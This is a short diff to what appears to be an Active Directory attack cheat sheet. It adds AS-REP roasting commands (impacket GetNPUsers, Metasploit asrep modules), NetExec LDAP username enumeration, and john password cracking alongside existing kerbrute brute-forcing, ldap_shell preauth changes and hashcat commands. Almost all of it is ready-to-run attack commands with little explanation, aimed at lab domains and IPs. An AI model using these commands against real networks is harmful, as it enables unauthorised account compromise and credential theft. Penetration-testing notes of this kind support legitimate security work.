@@ -8,6 +8,8 @@ kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman
 cat combos.lst | ./kerbrute -d lab.ropnop.com bruteforce -
 ```
 
+
+
 using metasploit:
 ```bash
 use auxiliary/scanner/kerberos/kerberos_login
@@ -66,7 +68,7 @@ ldap_shell ignite.local/administrator:Ignite@987 -dc-ip 192.168.1.48
 set_dontreqpreauth yashika true
 set_dontreqpreauth yashika false
 
-#in valid user
+#in valid_user.txt
 jdoe
 asmith
 svc_backup
@@ -74,8 +76,29 @@ admin@corp.local
 corp.local\svc_sql
 
 
+impacket-GetNPUsers ignite.local/yashika -dc-ip 192.168.1.48 -no-pass
 GetNPUsers.py corp.local/ -usersfile valid_users.txt -dc-ip 192.168.1.10 -outputfile asreproast_hashes.txt
+
+use auxiliary/gather/asrep
+set rhosts 192.168.1.48
+set domain ignite.local
+set user_file users.txt
+run
+
+use auxiliary/gather/asrep
+set domain ignite.local
+set rhosts 192.168.1.48
+set username yashika
+run
+
+
+nxc ldap 192.168.154.134 -u "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt" -p '' -k
+
+
+
 hashcat -m 18200 asreproast_hashes.txt rockyou.txt
+john -w=/usr/share/wordlists/rockyou.txt hashes
+
 
 
 ```
